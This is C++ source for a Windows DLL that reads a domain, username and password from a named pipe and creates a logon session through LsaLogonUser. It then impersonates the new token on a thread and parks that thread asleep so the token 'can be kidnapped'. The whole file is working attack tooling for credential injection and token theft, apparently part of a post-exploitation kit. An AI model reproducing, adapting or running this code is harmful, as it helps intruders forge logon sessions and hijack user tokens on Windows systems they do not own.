// logon.cpp : Defines the exported functions for the DLL application.
//

#include "stdafx.h"

using namespace std;

size_t wcsByteLen( const wchar_t* str );
void InitUnicodeString( UNICODE_STRING& str, const wchar_t* value, BYTE* buffer, size_t& offset );
PVOID CreateNtlmLogonStructure(const wchar_t* domain, const wchar_t* username, const wchar_t* password, DWORD* size);
size_t WriteUnicodeString(const wchar_t* str, UNICODE_STRING* uniStr, PVOID address);

extern "C" __declspec( dllexport ) void VoidFunc();


extern "C" __declspec( dllexport ) void VoidFunc()
{
	//Get username/password from named pipe
	//wofstream outFile;
	//outFile.open("c:\\temp\\pipe.txt");

	HANDLE pipe = CreateFile(L"\\\\.\\pipe\\p", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (pipe == INVALID_HANDLE_VALUE)
	{
		cout << "Failed to open named pipe" << endl;
	}

	const size_t strSize = 257;
	size_t bytesToRead = strSize * sizeof(wchar_t) - sizeof(wchar_t);
	wchar_t* domain = new wchar_t[strSize];
	wchar_t* username = new wchar_t[strSize];
	wchar_t* password = new wchar_t[strSize];
	DWORD bytesRead = 0;
	BOOL success = ReadFile(pipe, domain, strSize, &bytesRead, NULL);
	if (!success)
	{
		return;
	}
	domain[bytesRead/2] = '\0';

	success = ReadFile(pipe, username, strSize-2, &bytesRead, NULL);
	if (!success)
	{
		return;
	}
	username[bytesRead/2] = '\0';

	success = ReadFile(pipe, password, strSize-2, &bytesRead, NULL);
	if (!success)
	{
		return;
	}
	password[bytesRead/2] = '\0';

	//wstring final = wstring(domain) + wstring(L"\\") + wstring(username) + wstring(L" : ") + wstring(password);
	//outFile <<  final;

	

	//Get a handle to LSA
	HANDLE hLSA = NULL;
	NTSTATUS status = LsaConnectUntrusted(&hLSA);
	if (status != 0)
	{
		cout << "Error calling LsaConnectUntrusted. Error code: " << status << endl;
		return;
	}
	if (hLSA == NULL)
	{
		cout << "hLSA is NULL, this shouldn't ever happen" << endl;
		return;
	}

	//Build LsaLogonUser parameters
	LSA_STRING originName = {};
	char originNameStr[] = "qpqp";
	originName.Buffer = originNameStr;
	originName.Length = (USHORT)strlen(originNameStr);
	originName.MaximumLength = originName.Length;

	ULONG authPackage = 0;
	PLSA_STRING authPackageName = new LSA_STRING();
	char authPackageBuf[] = MSV1_0_PACKAGE_NAME;
	authPackageName->Buffer = authPackageBuf;
	authPackageName->Length = (USHORT)strlen(authPackageBuf);
	authPackageName->MaximumLength = (USHORT)strlen(authPackageBuf);
	status = LsaLookupAuthenticationPackage(hLSA, authPackageName, &authPackage);
	if (status != 0)
	{
		int winError = LsaNtStatusToWinError(status);
		cout << "Call to LsaLookupAuthenticationPackage failed. Error code: " << winError;
		return;
	}

	DWORD authBufferSize = 0;
	PVOID authBuffer = CreateNtlmLogonStructure(domain, username, password, &authBufferSize);

	//Get TokenSource
	HANDLE hProcess = GetCurrentProcess();//todo
	HANDLE procToken = NULL;
	success = OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &procToken);
	if (!success)
	{
		DWORD errorCode = GetLastError();
		cout << "Call to OpenProcessToken failed. Errorcode: " << errorCode << endl;
		return;
	}

	TOKEN_SOURCE tokenSource = {};
	DWORD realSize = 0;
	success = GetTokenInformation(procToken, TokenSource, &tokenSource, sizeof(tokenSource), &realSize);
	if (!success)
	{
		cout << "Call to GetTokenInformation failed." << endl;
		return;
	}

	//Misc
	PVOID profileBuffer = NULL;
	ULONG profileBufferSize = 0;
	LUID loginId;
	HANDLE token = NULL;
	QUOTA_LIMITS quotaLimits;
	NTSTATUS subStatus = 0;

	//Log on the user
	status = LsaLogonUser(hLSA, 
		&originName, 
		RemoteInteractive, 
		authPackage, 
		authBuffer,
		authBufferSize, 
		0, 
		&tokenSource, 
		&profileBuffer,
		&profileBufferSize,
		&loginId,
		&token,
		&quotaLimits,
		&subStatus);

	if (status != 0)
	{
		NTSTATUS winError = LsaNtStatusToWinError(status);
		cout << "Error calling LsaLogonUser. Error code: " << winError << endl;
		return;
	}

	//cout << "Success!" << endl;

	
	//Impersonate the token with the current thread so it can be kidnapped
	ImpersonateLoggedOnUser(token);

	//Put the thread to sleep so it can be impersonated
	HANDLE permenantSleep = CreateMutex(NULL, false, NULL);
	while(1)
	{
		Sleep(MAXDWORD);
	}

	return;
}

//size will be set to the size of the structure created
PVOID CreateNtlmLogonStructure(const wchar_t* domain, const wchar_t* username, const wchar_t* password, DWORD* size)
{
	size_t wcharSize = sizeof(wchar_t);

	size_t totalSize = sizeof(MSV1_0_INTERACTIVE_LOGON) + ((lstrlenW(domain) + lstrlenW(username) + lstrlenW(password)) * wcharSize);
	MSV1_0_INTERACTIVE_LOGON* ntlmLogon = (PMSV1_0_INTERACTIVE_LOGON)(new BYTE[totalSize]);
	size_t writeAddress = (UINT_PTR)ntlmLogon + sizeof(MSV1_0_INTERACTIVE_LOGON);

	ntlmLogon->MessageType = MsV1_0InteractiveLogon;
	writeAddress += WriteUnicodeString(domain, &(ntlmLogon->LogonDomainName), (PVOID)writeAddress);
	writeAddress += WriteUnicodeString(username, &(ntlmLogon->UserName), (PVOID)writeAddress);
	writeAddress += WriteUnicodeString(password, &(ntlmLogon->Password), (PVOID)writeAddress);

	*size = (DWORD)totalSize; //If the size is bigger than a DWORD, there is a gigantic bug somewhere.
	return ntlmLogon;
}

//Returns the amount of bytes written.
size_t WriteUnicodeString(const wchar_t* str, UNICODE_STRING* uniStr, PVOID address)
{
	size_t size = lstrlenW(str) * sizeof(wchar_t);
	uniStr->Length = (USHORT)size;
	uniStr->MaximumLength = (USHORT)size;
	uniStr->Buffer = (PWSTR)address;
	memcpy(address, str, size);
	return size;
}